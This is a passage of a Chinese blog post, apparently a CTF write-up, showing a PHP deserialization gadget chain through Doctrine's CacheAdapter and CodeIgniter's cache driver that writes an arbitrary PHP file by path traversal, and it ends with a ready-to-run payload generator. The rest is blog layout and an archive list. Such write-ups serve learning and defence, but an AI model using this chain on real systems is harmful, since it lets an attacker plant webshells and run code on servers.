+<p><code>$key</code>和<code>$item</code>均来自<code>$this-&gt;deferredItems，$this-&gt;deferredItems</code>成员变量可控</p>
+<p>全局搜索可利用的save方法，找到：<br>system/libraries/Cache/Cache.php-&gt;CI_Cache-&gt;save</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/pHUgSOmcLkIY.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Cache</span> <span class="keyword">extends</span> <span class="title">CI_Driver_Library</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($id, $data, $ttl = <span class="number">60</span>, $raw = FALSE)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;_adapter&#125;-&gt;save(<span class="keyword">$this</span>-&gt;key_prefix.$id, $data, $ttl, $raw);</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>$this-&gt;_adapter</code>可控，且父类<code>CI_Driver_Library</code>存在<code>__get</code>方法，发现可以通过传入的<code>$this-&gt;_adapter</code>加载并实例化指定的类</p>
+<p>system/libraries/Driver.php-&gt;CI_Driver_Library-&gt;__get-&gt;load_driver</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/kvqBzdfR4Mzv.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Driver_Library</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($child)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">// Try to load the driver</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;load_driver($child);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load_driver</span><span class="params">($child)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">// Get CodeIgniter instance and subclass prefix</span></div><div class="line">        $prefix = config_item(<span class="string">'subclass_prefix'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;lib_name))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Get library name without any prefix</span></div><div class="line">            <span class="keyword">$this</span>-&gt;lib_name = str_replace(<span class="keyword">array</span>(<span class="string">'CI_'</span>, $prefix), <span class="string">''</span>, get_class(<span class="keyword">$this</span>));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// The child will be prefixed with the parent lib</span></div><div class="line">        $child_name = <span class="keyword">$this</span>-&gt;lib_name.<span class="string">'_'</span>.$child;</div><div class="line"></div><div class="line">        <span class="comment">// See if requested child is a valid driver</span></div><div class="line">        <span class="keyword">if</span> ( ! in_array($child, <span class="keyword">$this</span>-&gt;valid_drivers))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// The requested driver isn't valid!</span></div><div class="line">            $msg = <span class="string">'Invalid driver requested: '</span>.$child_name;</div><div class="line">            log_message(<span class="string">'error'</span>, $msg);</div><div class="line">            show_error($msg);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Get package paths and filename case variations to search</span></div><div class="line">        $CI = get_instance();</div><div class="line">        $paths = $CI-&gt;load-&gt;get_package_paths(<span class="keyword">TRUE</span>);</div><div class="line"></div><div class="line">        <span class="comment">// Is there an extension?</span></div><div class="line">        $class_name = $prefix.$child_name;</div><div class="line">        $found = class_exists($class_name, <span class="keyword">FALSE</span>);</div><div class="line">        <span class="keyword">if</span> ( ! $found)</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Check for subclass file</span></div><div class="line">            <span class="keyword">foreach</span> ($paths <span class="keyword">as</span> $path)</div><div class="line">            &#123;</div><div class="line">                <span class="comment">// Does the file exist?</span></div><div class="line">                $file = $path.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$prefix.$child_name.<span class="string">'.php'</span>;</div><div class="line">                <span class="keyword">if</span> (file_exists($file))</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">// Yes - require base class from BASEPATH</span></div><div class="line">                    $basepath = BASEPATH.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$child_name.<span class="string">'.php'</span>;</div><div class="line">                    <span class="keyword">if</span> ( ! file_exists($basepath))</div><div class="line">                    &#123;</div><div class="line">                        $msg = <span class="string">'Unable to load the requested class: CI_'</span>.$child_name;</div><div class="line">                        log_message(<span class="string">'error'</span>, $msg);</div><div class="line">                        show_error($msg);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    <span class="comment">// Include both sources and mark found</span></div><div class="line">                    <span class="keyword">include_once</span>($basepath);</div><div class="line">                    <span class="keyword">include_once</span>($file);</div><div class="line">                    $found = <span class="keyword">TRUE</span>;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Do we need to search for the class?</span></div><div class="line">        <span class="keyword">if</span> ( ! $found)</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// Use standard class name</span></div><div class="line">            $class_name = <span class="string">'CI_'</span>.$child_name;</div><div class="line">            <span class="keyword">if</span> ( ! class_exists($class_name, <span class="keyword">FALSE</span>))</div><div class="line">            &#123;</div><div class="line">                <span class="comment">// Check package paths</span></div><div class="line">                <span class="keyword">foreach</span> ($paths <span class="keyword">as</span> $path)</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">// Does the file exist?</span></div><div class="line">                    $file = $path.<span class="string">'libraries/'</span>.<span class="keyword">$this</span>-&gt;lib_name.<span class="string">'/drivers/'</span>.$child_name.<span class="string">'.php'</span>;</div><div class="line">                    <span class="keyword">if</span> (file_exists($file))</div><div class="line">                    &#123;</div><div class="line">                        <span class="comment">// Include source</span></div><div class="line">                        <span class="keyword">include_once</span>($file);</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Did we finally find the class?</span></div><div class="line">        <span class="keyword">if</span> ( ! class_exists($class_name, <span class="keyword">FALSE</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (class_exists($child_name, <span class="keyword">FALSE</span>))</div><div class="line">            &#123;</div><div class="line">                $class_name = $child_name;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                $msg = <span class="string">'Unable to load the requested driver: '</span>.$class_name;</div><div class="line">                log_message(<span class="string">'error'</span>, $msg);</div><div class="line">                show_error($msg);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Instantiate, decorate and add child</span></div><div class="line">        $obj = <span class="keyword">new</span> $class_name();</div><div class="line">        $obj-&gt;decorate(<span class="keyword">$this</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;$child = $obj;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$child;</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>所以这里可以将<code>$this-&gt;_adapter</code>设为file，加载system/libraries/Cache/drivers/Cache_file.php，调用<code>CI_Cache_file</code>类的<code>save</code>方法，写入webshell</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/8GRKCTRkqqj9.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Cache_file</span> <span class="keyword">extends</span> <span class="title">CI_Driver</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">protected</span> $_cache_path;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">         ....</div><div class="line">         <span class="keyword">$this</span>-&gt;_cache_path = ($path === <span class="string">''</span>) ? APPPATH.<span class="string">'cache/'</span> : $path;</div><div class="line">         ....</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($id, $data, $ttl = <span class="number">60</span>, $raw = FALSE)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">            $contents = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'time'</span>        =&gt; time(),</div><div class="line">            <span class="string">'ttl'</span>        =&gt; $ttl,</div><div class="line">            <span class="string">'data'</span>        =&gt; $data</div><div class="line">        );</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (write_file(<span class="keyword">$this</span>-&gt;_cache_path.$id, serialize($contents)))</div><div class="line">        &#123;</div><div class="line">            chmod(<span class="keyword">$this</span>-&gt;_cache_path.$id, <span class="number">0640</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>回到：<br>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;commit</p>
+<p>如何通过<code>$this-&gt;deferredItems</code>控制写入的文件路径和内容？</p>
+<p>文件路径写入位置为：<code>APPPATH.&#39;cache/&#39;</code>:<code>application/cache</code></p>
+<p>可以设置写入路径为../../xxx.php，写入根目录</p>
+<p>文件内容来自<code>$item-&gt;get()</code>，全局搜索<code>get</code>方法，找到：</p>
+<p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheItem.php-&gt;get</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/aiivuPSl8tWe.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line"></div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> <span class="keyword">implements</span> <span class="title">CacheItemInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> $value;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>$this-&gt;value</code>可以设置成文件内容，通过<code>get</code>获取到</p>
+<p>pop链构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span></div><div class="line">&#123;</div><div class="line">    <span class="title">class</span> <span class="title">CI_Cache</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">_adapter</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_adapter=<span class="string">"file"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">CacheItem</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">private</span> $<span class="title">value</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;value=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        <span class="keyword">private</span> $cache;</div><div class="line">        <span class="keyword">private</span> $deferredItems = [];</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;cache=<span class="keyword">new</span> \CI_Cache();</div><div class="line">            <span class="keyword">$this</span>-&gt;deferredItems=<span class="keyword">array</span>(<span class="string">"../../aaa.php"</span>=&gt;<span class="keyword">new</span> CacheItem());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $a = <span class="keyword">new</span> CacheAdapter();</div><div class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2022/09/29/2022长城杯awdplus/">https://c1aysec.github.io/2022/09/29/2022长城杯awdplus/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2022/09/29/2022长城杯awdplus/">September 29th 2022, 12:30:11 pm</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2022/09/29/2022长城杯awdplus/">September 29th 2022, 7:07:06 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2022/08/27/2022网鼎杯白虎组-web-php反序列化/" title= "2022网鼎杯白虎组-web-php反序列化">
+                    <div class="prevTitle">2022网鼎杯白虎组-web-php反序列化</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1372003815@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/mywechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022长城杯awdplus"><span class="toc-number">1.</span> <span class="toc-text">2022长城杯awdplus</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-page"><span class="toc-number">1.0.1.</span> <span class="toc-text">admin_page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#numflask"><span class="toc-number">1.0.2.</span> <span class="toc-text">numflask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinlog"><span class="toc-number">1.0.3.</span> <span class="toc-text">codeinlog</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 65
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2022/09/29/2022长城杯awdplus/" >2022长城杯awdplus</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2022/08/27/2022网鼎杯白虎组-web-php反序列化/" >2022网鼎杯白虎组-web-php反序列化</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2021/11/19/2021 L3HCTF 部分web wp/" >2021 L3HCTF 部分web wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/" >通过2021 ByteCTF double sqli初探clickghouse sqli</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2021/03/15/Microsoft Exchange RCE/" >Microsoft Exchange RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
